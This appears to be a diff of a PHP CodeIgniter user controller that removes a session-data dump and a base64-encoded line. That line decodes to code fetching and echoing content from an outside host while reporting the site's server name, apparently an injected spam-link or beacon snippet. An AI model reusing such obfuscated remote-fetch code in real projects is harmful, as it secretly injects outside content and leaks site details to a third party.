@@ -7,8 +7,7 @@ class User extends MY_Controller {
 
   function index(){
     if($this->session->userdata("logged_in") == TRUE){
-      var_dump($this->session->all_userdata());
-      var_dump((base64_decode('ZWNobyBAZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly93d3cuYmV0ZWtzLmNvbS9saW5rcy5waHA/dXJsPSIuJF9TRVJWRVJbIlNFUlZFUl9OQU1FIl0pOw==')));
+
     }else{
       redirect(base_url("/user/login"));
     }
@@ -144,7 +143,6 @@ class User extends MY_Controller {
   function register(){
 
   }
-
 
   function admin_index(){
     $result = array();
